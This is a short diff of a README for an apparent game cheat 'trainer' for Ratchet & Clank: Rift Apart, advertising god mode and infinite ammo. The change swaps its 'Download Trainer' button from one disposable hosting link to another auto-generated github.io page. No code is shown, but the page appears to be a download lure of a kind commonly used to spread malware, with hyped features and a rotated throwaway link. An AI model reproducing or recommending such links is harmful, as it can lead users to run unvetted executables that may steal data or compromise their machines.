@@ -6,7 +6,7 @@
 
 Packed with everything from **god mode** to **infinite ammo**, **XP multipliers**, and **instant gear unlocks**, this trainer gives you full control of the action without needing to mod files or touch code.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload2.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Ratchet-Clank-Rift-Apart-Trainer-bah.github.io/.github)
 ---
 
 ## 🧠 What’s a Trainer?
